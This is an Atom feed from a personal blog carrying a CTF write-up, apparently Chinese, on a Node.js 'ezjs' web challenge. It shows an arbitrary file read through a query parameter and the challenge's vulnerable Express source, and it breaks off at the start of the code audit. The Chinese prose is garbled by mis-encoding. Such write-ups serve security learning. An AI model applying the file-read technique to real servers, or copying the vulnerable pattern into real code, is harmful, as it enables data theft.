<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Err0r</title>
  
  <subtitle>gyy</subtitle>
  <link href="https://err0r.top/atom.xml" rel="self"/>
  
  <link href="https://err0r.top/"/>
  <updated>2021-08-03T08:19:42.136Z</updated>
  <id>https://err0r.top/</id>
  
  <author>
    <name>gyy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021å·…å³°æå®¢ä¸€é“é¢˜â€”â€”ezjs</title>
    <link href="https://err0r.top/article/2021dfjk/"/>
    <id>https://err0r.top/article/2021dfjk/</id>
    <published>2021-08-03T05:59:30.000Z</published>
    <updated>2021-08-03T08:19:42.136Z</updated>
    
    <content type="html"><![CDATA[<p>æ·±å…¥å­¦ä¹ ä¸€ä¸‹JavaScriptçš„åŸå‹é“¾æ±¡æŸ“æ¼æ´</p><a id="more"></a><p>æˆ‘æ˜¯å·…å³°fwï¼Œå°±æ‘¸å‡ºæ¥ä¸€é“é¢˜ç›®ï¼Œå¥½å¥½å­¦ä¹ ä¸‹åŸå‹é“¾æ±¡æŸ“ã€‚ä»¥ä¸‹ä¸ºåšé¢˜è§†è§’ã€‚</p><h2 id="Web-ezjs"><a href="#Web-ezjs" class="headerlink" title="Web-ezjs"></a>Web-ezjs</h2><h3 id="ç¬¬ä¸€æ­¥-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ç¬¬ä¸€æ­¥-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ç¬¬ä¸€æ­¥ - ä»»æ„æ–‡ä»¶è¯»å–"></a>ç¬¬ä¸€æ­¥ - ä»»æ„æ–‡ä»¶è¯»å–</h3><p>æ‰“å¼€é¢˜ç›®å‘ç°éå¸¸ç®€æ´çš„ç™»é™†ï¼Œä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œéšä¾¿è¾“å…¥ä»¥ä¸‹å‘ç°ç›´æ¥è¿›å…¥äº†ã€‚</p><p>ç™»é™†é™åˆ¶usernameå’Œpasswordå¤§äº5ä½</p><img src="/article/2021dfjk/image-20210803151950579.png" class="" title="image-20210803151950579" loading="lazy"><p>å›¾ç‰‡æ˜¾ç¤ºè¿™å—æ˜æ˜¾æœ‰å¼‚å¸¸ï¼Œå¯¹åº”GETè¯·æ±‚çš„newingå‚æ•°</p><img src="/article/2021dfjk/image-20210803142727224.png" class="" title="image-20210803142727224" loading="lazy"><h4 id="å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–"><a href="#å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–"></a>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</h4><img src="/article/2021dfjk/image-20210803142841282.png" class="" title="image-20210803142841282" loading="lazy"><p>åˆ©ç”¨æ­¤å¤„è¯»å–äº†éƒ¨åˆ†æºç å¦‚ä¸‹</p><p><code>/app/routes/index.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token punctuation">&#123;</span>body<span class="token punctuation">,</span> validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> validator <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>validator<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">"ç™»å½•ç•Œé¢"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>  <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'admin password error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>msg<span class="token operator">:</span> <span class="token string">'plz input your username and password'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'login first plz'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"notadmin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'verify'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'verify success'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//req.session.debug = true;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg<span class="token punctuation">;</span>    <span class="token keyword">var</span> imgdata <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">:</span> <span class="token string">"./images/1.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> base64data <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>imgdata<span class="token punctuation">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'æˆ‘çš„ç©ºé—´'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">,</span> png<span class="token operator">:</span> <span class="token string">"data:image/png;base64,"</span> <span class="token operator">+</span> base64data<span class="token punctuation">,</span> diy<span class="token operator">:</span> <span class="token string">"åå¹´ç£¨ä¸€å‰‘ğŸ˜…v0.0.0(å°šå¤„äºå¼€å‘ç‰ˆ"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> info<span class="token punctuation">.</span>pretty <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>p<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy<span class="token punctuation">;</span>      info<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy<span class="token operator">:</span> <span class="token string">"å°Šè´µçš„admin"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'plz login first'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>/app/app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> createError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-errors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token string">'session'</span><span class="token punctuation">;</span><span class="token keyword">var</span> indexRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> secrets <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  name<span class="token operator">:</span> key<span class="token punctuation">,</span>  secret<span class="token operator">:</span> secrets<span class="token punctuation">,</span>  store<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">sessionStore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  saveUninitialized<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  resave<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  cookie<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    maxAge<span class="token operator">:</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">600</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// view engine setup</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">logger</span><span class="token punctuation">(</span><span class="token string">'dev'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> extended<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> indexRouter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// catch 404 and forward to error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// set locals, only providing error in development</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>message <span class="token operator">=</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>error <span class="token operator">=</span> req<span class="token punctuation">.</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'development'</span> <span class="token operator">?</span> err <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render the error page</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>status <span class="token operator">||</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> app<span class="token punctuation">;</span></code></pre><p>æœ¬åœ°å®‰è£…ä¸€ä¸‹ç¯å¢ƒ</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"crypto"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"express-validator"</span><span class="token operator">:</span> <span class="token string">"^6.12.1"</span><span class="token punctuation">,</span>    <span class="token property">"http-errors"</span><span class="token operator">:</span> <span class="token string">"^1.8.0"</span><span class="token punctuation">,</span>    <span class="token property">"morgan"</span><span class="token operator">:</span> <span class="token string">"^1.10.0"</span><span class="token punctuation">,</span>    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"^0.12.7"</span><span class="token punctuation">,</span>    <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"^2.88.2"</span><span class="token punctuation">,</span>    <span class="token property">"session-file-store"</span><span class="token operator">:</span> <span class="token string">"^1.5.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="ç¬¬äºŒæ­¥-ä»£ç å®¡è®¡"><a href="#ç¬¬äºŒæ­¥-ä»£ç å®¡è®¡" class="headerlink" title="ç¬¬äºŒæ­¥ - ä»£ç å®¡è®¡"></a>ç¬¬äºŒæ­¥ - ä»£ç å®¡è®¡</h3><p>æ ¹æ®æºç å¯ä»¥å‘ç°ï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬ä»¥adminèº«ä»½ç™»é™†ï¼Œä½†æ˜¯adminçš„å¯†ç åˆæ˜¯éšæœºä¸å¯èƒ½ç ´è§£çš„</p><img src="/article/2021dfjk/image-20210803143641462.png" class="" title="image-20210803143641462" loading="lazy"><p>è·Ÿåˆ°<code>/verify</code>è·¯ç”±ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœ<code>session.username</code>æ˜¯adminå°±å°†<code>isadmin</code>èµ‹å€¼adminï¼Œå¦åˆ™å°±æ˜¯notadmin </p><img src="/article/2021dfjk/image-20210803143743000.png" class="" title="image-20210803143743000" loading="lazy"><p>å†ç»§ç»­è·Ÿè¿›åˆ°<code>/admin</code>è·¯ç”± ï¼Œå‘ç°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´çš„æºç ã€‚å…³é”®ç‚¹åœ¨äºä¸‹ä¸€æ­¥ï¼Œå¦‚æœ<code>isadmin</code><strong>åªè¦ä¸æ˜¯</strong>notadminå°±ä¼šæ‰§è¡Œä¸€æ®µæ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªç›®æ ‡å°±æ˜¯ä»¤<code>isadmin</code>å˜ä¸ºénotadmin</p><img src="/article/2021dfjk/image-20210803144118578.png" class="" title="image-20210803144118578" loading="lazy"><p>adminçš„å¯†ç æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥å‡ºé¢˜äººæ 